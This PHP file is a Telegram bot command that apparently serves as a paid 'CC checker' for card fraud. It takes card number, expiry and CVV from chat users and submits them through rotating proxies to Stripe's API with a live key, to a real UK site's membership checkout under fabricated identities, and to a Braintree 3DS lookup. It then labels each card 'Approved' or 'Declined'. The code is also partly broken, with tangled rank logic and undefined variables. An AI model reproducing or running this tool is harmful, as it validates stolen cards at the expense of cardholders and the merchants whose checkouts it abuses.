<?php

error_reporting(E_ALL);
ini_set('display_errors', 1);

ini_set('log_errors', TRUE);
ini_set('error_log', 'errors.log');
//=========RANK DETERMINE=========//
$currentDate = date('Y-m-d');
$rank = "FREE";
$expiryDate = "0";

$paidUsers = file('Database/Premium.txt', FILE_IGNORE_NEW_LINES);
$freeUsers = file('Database/free.txt', FILE_IGNORE_NEW_LINES);
$owners = file('Database/owner.txt', FILE_IGNORE_NEW_LINES);

if (in_array($userId, $owners)) {
    $rank = "OWNER";
    $expiryDate = "UNTIL DEAD";
} else {
    foreach ($paidUsers as $index => $line) {
        list($userIdFromFile, $userExpiryDate) = explode(" ", $line);
        if ($userIdFromFile == $userId) {
            if ($userExpiryDate < $currentDate) {
                unset($paidUsers[$index]); //
                file_put_contents('Database/Premium.txt', implode("\n", $paidUsers));
                $freeUsers[] = $userId; // add to free users list
                file_put_contents('Database/free.txt', implode("\n", $freeUsers));
            } else    $currentDate = date('Y-m-d');
            $rank = "FREE";
            $expiryDate = "0";

            $paidUsers = file('Database/Premium.txt', FILE_IGNORE_NEW_LINES);
            $freeUsers = file('Database/free.txt', FILE_IGNORE_NEW_LINES);
            $owners = file('Database/owner.txt', FILE_IGNORE_NEW_LINES);

            if (in_array($userId, $owners)) {
                $rank = "OWNER";
                $expiryDate = "UNTIL DEAD";
            } else {
                foreach ($paidUsers as $index => $line) {
                    list($userIdFromFile, $userExpiryDate) = explode(" ", $line);
                    if ($userIdFromFile == $userId) {
                        if ($userExpiryDate < $currentDate) {
                            unset($paidUsers[$index]);
                            file_put_contents('Database/Premium.txt', implode("\n", $paidUsers));
                            $freeUsers[] = $userId;
                            file_put_contents('Database/free.txt', implode("\n", $freeUsers));
                        } else {
                            $rank = "Premium";
                            $expiryDate = $userExpiryDate;
                        }
                    }
                }
            } {
                $rank = "Premium";
                $expiryDate = $userExpiryDate;
            }
        }
    }
}

  //=======RANK DETERMINE END=========//
  $update = json_decode(file_get_contents("php://input"), TRUE);
  $text = $update["message"]["text"];
  //========WHO CAN CHECK FUNC========//

  //=====WHO CAN CHECK FUNC END======//
  if (preg_match('/^(\/brr|\.brr|!brr)/', $text)) {
      $userid = $update['message']['from']['id'];

      if (!checkAccess($userid)) {
          $sent_message_id = send_reply($chatId, $message_id, $keyboard, "<b> @$username You're not Premium user❌</b>", $message_id);
        exit();
      }
  $start_time = microtime(true);

    $chatId = $update["message"]["chat"]["id"];
      $message_id = $update["message"]["message_id"];
      $keyboard = "";

  //=======WHO CAN CHECK END========//

  //====ANTISPAM AND WRONG FORMAT====//
      if (strlen($message) <= 4) {
              sendMessage($chatId, '<b>• Wrong Format! ⚠️</b>%0A• 𝘚𝘦𝘯𝘥 <code>/bra cc|mm|yy|cvv</code>%0A• 𝘎𝘢𝘵𝘦𝘸𝘢𝘺 $gate', $message_id);
              exit();
    }
  $r = "0";

  $r = rand(0, 100);
  //==ANTISPAM AND WRONG FORMAT END==//


  //=======checker part start========//
  if ($_SERVER['REQUEST_METHOD'] == "POST") {
      extract($_POST);
  } elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
      extract($_GET);
  }
  function inStr($string, $start, $end, $value) {
      $str = explode($start, $string);
      $str = explode($end, $str[$value]);
      return $str[0];
  }


  $lista = substr($message, 5);
  $separa = explode("|", $lista);
  $cc = isset($separa[0]) ? substr($separa[0], 0, 16) : ''; // Get only first 16 digits
  $mes = isset($separa[1]) ? $separa[1] : '';
  $ano = isset($separa[2]) ? $separa[2] : '';
  $cvv = isset($separa[3]) ? $separa[3] : '';


  $last4 = substr($cc, -4);


  $sent_message_id = send_reply($chatId, $message_id, $keyboard, "<b>REVIEWING YOU'RE REQUEST ✅</b>");

  function value($str,$find_start,$find_end)
  {
      $start = @strpos($str,$find_start);
      if ($start === false) 
      {
          return "";
      }
      $length = strlen($find_start);
      $end    = strpos(substr($str,$start +$length),$find_end);
      return trim(substr($str,$start +$length,$end));
  }

  function mod($dividendo,$divisor)
  {
      return round($dividendo - (floor($dividendo/$divisor)*$divisor));
  }
  //================[Functions and Variables]================//
  #------[Email Generator]------#



  function emailGenerate($length = 10)
  {
      $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
      $charactersLength = strlen($characters);
      $randomString     = '';
      for ($i = 0; $i < $length; $i++) {
          $randomString .= $characters[rand(0, $charactersLength - 1)];
      }
      return $randomString . '@gmail.com';
  }
  $email = emailGenerate();
  #------[Username Generator]------#
  function usernameGen($length = 13)
  {
      $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
      $charactersLength = strlen($characters);
      $randomString     = '';
      for ($i = 0; $i < $length; $i++) {
          $randomString .= $characters[rand(0, $charactersLength - 1)];
      }
      return $randomString;
  }
  $un = usernameGen();
  #------[Password Generator]------#
  function passwordGen($length = 15)
  {
      $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
      $charactersLength = strlen($characters);
      $randomString     = '';
      for ($i = 0; $i < $length; $i++) {
          $randomString .= $characters[rand(0, $charactersLength - 1)];
      }
      return $randomString;
  }
  $pass = passwordGen();

  #------[CC Type Randomizer]------#

   $cardNames = array(
      "3" => "American Express",
      "4" => "Visa",
      "5" => "MasterCard",
      "6" => "Discover"
   );
   $card_type = $cardNames[substr($cc, 0, 1)];




    //------------Card info------------//
    $lista = '' . $cc . '|' . $mes . '|' . $an . '|' . $cvv . '';
  $ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank1 = GetStr($fim, '"bank":{"name":"', '"');
$name2 = GetStr($fim, '"name":"', '"');
$brand = GetStr($fim, '"brand":"', '"');
$country = GetStr($fim, '"country":{"name":"', '"');
$emoji = GetStr($fim, '"emoji":"', '"');
$name1 = "".$name2."".$emoji."";
$scheme = GetStr($fim, '"scheme":"', '"');
$type = GetStr($fim, '"type":"', '"');
$currency = GetStr($fim, '"currency":"', '"');
if(strpos($fim, '"type":"credit"') !== false){
}
curl_close($ch);

$ch = curl_init();
$bin = substr($cc, 0,6);
curl_setopt($ch, CURLOPT_URL, 'https://binlist.io/lookup/'.$bin.'/');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$bindata = curl_exec($ch);
$binna = json_decode($bindata,true);
$brand = $binna['scheme'];
$country = $binna['country']['name'];
$type = $binna['type'];
$bank = $binna['bank']['name'];
curl_close($ch);

  //IF BIN ARE NOT AVAILABLE ----//
  if (empty($bininfo)) {
      $bininfo = "N/A";
  }
  if (empty($bin)) {
      $bin = "N/A";
  }
  if (empty($country)) {
      $country = "N/A";
  }
  if (empty($bank)) {
      $bank = "N/A";
  }
  if (empty($country)) {
      $country = "N/A";
  }
  if (empty($emoji)) {
      $emoji = "N/A";
  }
  if (empty($currency)) {
      $currency = "N/A";
  }


    //------------Card info------------//




    sleep(1);
        edit_sent_message($chatId, $sent_message_id, "<b>
[×] PROCESS - ■□□□
- - - - - - - - - - - - - - - - - - -
[×] CARD ↯ <code>$lista</code>
[×] GATEWAY ↯ $gate
[×] BANK ↯ $bank
[×] TYPE ↯ $bininfo
[×] COUNTRY ↯ $country
- - - - - - - - - - - - - - - - - - -
|×| MAXIMUM TIME ↯ 25 SEC
|×| REQ BY ↯ @$username</b>");
        



  //=======================[5 REQ]==================================//
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_PROXY, $socks5);
  curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
  curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
  curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
  curl_setopt($ch, CURLOPT_POST, 1);
  $headers = array();
  $headers[] = 'Host: api.stripe.com';
  $headers[] = 'Accept: application/json';
  $headers[] = 'Accept-Language: en-US,en;q=0.8';
  $headers[] = 'Content-Type: application/x-www-form-urlencoded';
  $headers[] = 'Path: /v1/payment_methods';
  $headers[] = 'Origin: https://js.stripe.com';
  $headers[] = 'Referer: https://js.stripe.com/';
  $headers[] = 'sec-ch-ua: "Not/A)Brand";v="99", "Microsoft Edge";v="115", "Chromium";v="115"';
  $headers[] = 'sec-ch-ua-mobile: ?0';
  $headers[] = 'sec-ch-ua-platform: "Windows"';
  $headers[] = 'Sec-Fetch-Dest: empty';
  $headers[] = 'Sec-Fetch-Mode: cors';
  $headers[] = 'Sec-Fetch-Site: same-site';
  $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.188';
  curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=8f4c1b3a-b718-4354-9f49-529e223673c6172862&muid=9c2f94f4-b3d1-41d6-aefe-873867a6b0fe8514c3&sid=b1029f3a-f5c6-4bca-8cbc-a5c0b036dba3cdd035&pasted_fields=number&payment_user_agent=stripe.js%2F446752a876%3B+stripe-js-v3%2F446752a876&time_on_page=79322&key=pk_live_p3chKFwYavwRRZRTEF136qvf000QsjBDBL');

  $result1 = curl_exec($ch);
  $id = trim(strip_tags(getStr($result1,'"id": "','"')));
  $brandi = trim(strip_tags(getStr($result1,'"brand": "','"')));

  curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
  curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');


            sleep(1);
        edit_sent_message($chatId, $sent_message_id, "<b>
  [×] PROCESS - ■■□□
  - - - - - - - - - - - - - - - - - - -
  [×] CARD ↯ <code>$lista</code>
  [×] GATEWAY ↯ $gate
  [×] BANK ↯ $bank
  [×] TYPE ↯ $bininfo
  [×] COUNTRY ↯ $country
  - - - - - - - - - - - - - - - - - - -
  |×| MAXIMUM TIME ↯ 25 SEC
  |×| REQ BY ↯ @$username</b>");

        
  //==================req 1 end===============//
  //==================req 2===============//
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_PROXY, $socks5);
  curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
  curl_setopt($ch, CURLOPT_URL, 'https://clobberswap.co.uk/membership-account/membership-checkout/');
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_HEADER, 0);
  curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
  curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
  curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
              curl_setopt($ch, CURLOPT_POST, 1);
  $headers = array(
    'authority: clobberswap.co.uk',
    'method: POST',
    'path: /membership-account/membership-checkout/',
    'scheme: https',
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'accept-language: en-GB,en;q=0.6',
    'content-type: application/x-www-form-urlencoded; charset=UTF-8',
    'cookie: __stripe_mid=9c2f94f4-b3d1-41d6-aefe-873867a6b0fe8514c3;PHPSESSID=0d043d3ac6b31087107cc7de572b22a2;pmpro_visit=1;__stripe_sid=b1029f3a-f5c6-4bca-8cbc-a5c0b036dba3cdd035',
    'origin: https://clobberswap.co.uk',
    'referer: https://clobberswap.co.uk/membership-account/membership-checkout/',
    'sec-fetch-dest: document',
    'sec-fetch-mode: navigate',
    'sec-fetch-site: same-origin',
    'user-agent: Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36',
       );

    sleep(1);
        edit_sent_message($chatId, $sent_message_id, "<b>
  [×] PROCESS - ■■■□
  - - - - - - - - - - - - - - - - - - -
  [×] CARD ↯ <code>$lista</code>
  [×] GATEWAY ↯ $gate
  [×] BANK ↯ $bank
  [×] TYPE ↯ $bininfo
  [×] COUNTRY ↯ $country
  - - - - - - - - - - - - - - - - - - -
  |×| MAXIMUM TIME ↯ 25 SEC
  |×| REQ BY ↯ @$username</b>");  
        
        


  curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_POSTFIELDS, 'level=1&checkjavascript=1&username='.$firstname.'&password=abhyan3434&password2=abhyan3434&first_name=THU&last_name=RA&bemail='.$email.'&bconfirmemail_copy=1&fullname=&date_of_birth%5Bm%5D=6&date_of_birth%5Bd%5D=21&date_of_birth%5By%5D=2000&facebook=Thura&referral=&pmpro_address_1=3+Allen+Street&pmpro_address_2=&pmpro_town_city=New+York&pmpro_postcode=10080&CardType=visa&tos=1&comms_checkbox=1&collect_checkbox=1&submit-checkout=1&javascriptok=1&payment_method_id='.$id.'&AccountNumber=XXXXXXXXXXXX'.$last4.'&ExpirationMonth='.$mes.'&ExpirationYear='.$ano.'');


  curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
  curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

  $result2 = curl_exec($ch);
  $msg = trim(strip_tags(getStr($result2,'<div id="pmpro_message_bottom" class="pmpro_message pmpro_error">','</div>')));

  //==================req 2 end===============//

    //-------------------Req 6--------------//
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'https://api.braintreegateway.com/merchants/'.$merchant.'/client_api/v1/payment_methods/'.$token.'/three_d_secure/lookup');
  curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
  curl_setopt($ch, CURLOPT_POST, 1);
  $headers = array();
  $headers[] = 'Accept: */*';
  $headers[] = 'Content-Type: application/json';
  $headers[] = 'Host: api.braintreegateway.com';
  $headers[] = 'Origin: https://www.countereditions.com';
  $headers[] = 'Referer: https://www.countereditions.com/';
  $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36';
  curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_POSTFIELDS, '{"amount":"716.67","additionalInfo":{"billingLine1":"5th Ave","billingCity":"New York","billingState":"NY","billingPostalCode":"10080","billingCountryCode":"US","billingPhoneNumber":"987654321","billingGivenName":"'.$firstname.'","AbhyanSure":"'.$lastname.'"},"dfReferenceId":"1_b9b7fcf7-0046-451c-826d-1d2e5e4b2efa","clientMetadata":{"requestedThreeDSecureVersion":"2","sdkVersion":"web/3.79.1","cardinalDeviceDataCollectionTimeElapsed":347},"authorizationFingerprint":"'.$bearer.'","braintreeLibraryVersion":"braintree/web/3.79.1","_meta":{"merchantAppId":"www.countereditions.com","platform":"web","sdkVersion":"3.79.1","source":"client","integration":"custom","integrationType":"custom","sessionId":"bc00e723-b52e-448d-9c8f-fb0f5f265353"}}
  ');
  //-------------------Req 6 end--------------//
    sleep(1);
        edit_sent_message($chatId, $sent_message_id, "<b>
  [×] PROCESS - ■■■■
  - - - - - - - - - - - - - - - - - - -
  [×] CARD ↯ <code>$lista</code>
  [×] GATEWAY ↯ $gate
  [×] BANK ↯ $bank
  [×] TYPE ↯ $bininfo
  [×] COUNTRY ↯ $country
  - - - - - - - - - - - - - - - - - - -
  |×| MAXIMUM TIME ↯ 25 SEC
  |×| REQ BY ↯ @$username</b>");

  $end_time = microtime(true);
  $time = number_format($end_time - $start_time, 2);

    //======checker part end=========//


  if (
      strpos($result2, 'Thank you for your membership.') !== false ||
      strpos($result2, "Membership Confirmation") !== false ||
      strpos($result2, 'Your card zip code is incorrect.') !== false ||
      strpos($result2, "Thank You For Donation.") !== false ||
      strpos($result2, "incorrect_zip") !== false ||
      strpos($result2, "Success ") !== false ||
      strpos($result2, '"type":"one-time"') !== false ||
      strpos($result2, "/donations/thank_you?donation_number=") !== false
  ) {
    $resp = "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅

𝐂𝐚𝐫𝐝 ↯ <code>$lista</code>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↯ <code>Braintree Auth [V1]</code>
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↯ <code>Approved 🟢</code>

𝐁𝐢𝐧 𝐈𝐧𝐟𝐨 ↯ <code>$bininfo</code> 
𝐁𝐚𝐧𝐤 ↯ <code>$bank</code>
𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↯ <code>$country</code>

𝐓𝐢𝐦𝐞 ↯ <code>$time Seconds</code>
$botu";
  sleep(1);
  edit_sent_message($chatId, $sent_message_id, $resp);
  }


  elseif (
      strpos($result2, 'Error updating default payment method.Your card does not support this type of purchase.') !== false ||
      strpos($result2, "Your card does not support this type of purchase.") !== false ||
      strpos($result2, 'transaction_not_allowed') !== false ||
      strpos($result2, "insufficient_funds") !== false ||
      strpos($result2, "incorrect_zip") !== false ||
      strpos($result2, "Your card has insufficient funds.") !== false ||
      strpos($result2, '"status":"success"') !== false ||
      strpos($result2, "stripe_3ds2_fingerprint") !== false
  ) {
  $resp = "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅

𝐂𝐚𝐫𝐝 ↯ <code>$lista</code>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↯ <code>Braintree Auth [V1]</code>
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↯ <code>1000: Approved 🟢</code>

𝐁𝐢𝐧 𝐈𝐧𝐟𝐨 ↯ <code>$bininfo</code> 
𝐁𝐚𝐧𝐤 ↯ <code>$bank</code>
𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↯ <code>$country</code>

𝐓𝐢𝐦𝐞 ↯ <code>$time Seconds</code>
$botu";

  sleep(1);
  edit_sent_message($chatId, $sent_message_id, $resp);
  }


  elseif (
      strpos($result2, 'security code is incorrect.') !== false ||
      strpos($result2, 'security code is invalid.') !== false ||
      strpos($result2, "incorrect_cvc") !== false
  ) {
  $resp = "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅

𝐂𝐚𝐫𝐝 ↯ <code>$lista</code>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↯ <code>Braintree Auth [V1]</code>
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↯ <code> Card Issuer Declined CVV</code>

𝐁𝐢𝐧 𝐈𝐧𝐟𝐨 ↯ <code>$bininfo</code> 
𝐁𝐚𝐧𝐤 ↯ <code>$bank</code>
𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↯ <code>$country</code>

𝐓𝐢𝐦𝐞 ↯ <code>$time Seconds</code>
$botu";

  sleep(1);
  edit_sent_message($chatId, $sent_message_id, $resp);
  }


  elseif(strpos($result2, "Error updating default payment method. Your card was declined.")) {
  $resp = "𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌

𝐂𝐚𝐫𝐝 ↯ <code>$lista</code>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↯ <code>Braintree Auth [V1]</code>
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↯ <code>Card Declined</code>

𝐁𝐢𝐧 𝐈𝐧𝐟𝐨 ↯ <code>$bininfo</code> 
𝐁𝐚𝐧𝐤 ↯ <code>$bank</code>
𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↯ <code>$country</code>

𝐓𝐢𝐦𝐞 ↯ <code>$time Seconds</code>
$botu";

  sleep(1);
  edit_sent_message($chatId, $sent_message_id, $resp);
  }

  elseif(strpos($result2, "Unknown error generating account. Please contact us to set up your membership.")) {
  $resp = "𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌

𝐂𝐚𝐫𝐝 ↯ <code>$lista</code>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↯ <code>Braintree Auth [V1]</code>
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↯ <code>404 Error Dead</code>

𝐁𝐢𝐧 𝐈𝐧𝐟𝐨 ↯ <code>$bininfo</code> 
𝐁𝐚𝐧𝐤 ↯ <code>$bank</code>
𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↯ <code>$country</code>

𝐓𝐢𝐦𝐞 ↯ <code>$time Seconds</code>
$botu";

  sleep(1);
  edit_sent_message($chatId, $sent_message_id, $resp);
  }

  else {
  $resp = "𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌

𝐂𝐚𝐫𝐝 ↯ <code>$lista</code>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↯ <code>Braintree Auth [V1]</code>
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↯ <code>$msg</code>

𝐁𝐢𝐧 𝐈𝐧𝐟𝐨 ↯ <code>$bininfo</code> 
𝐁𝐚𝐧𝐤 ↯ <code>$bank</code>
𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↯ <code>$country</code>

𝐓𝐢𝐦𝐞 ↯ <code>$time Seconds</code>
$botu";

  sleep(1);
  edit_sent_message($chatId, $sent_message_id, $resp);
  }
  }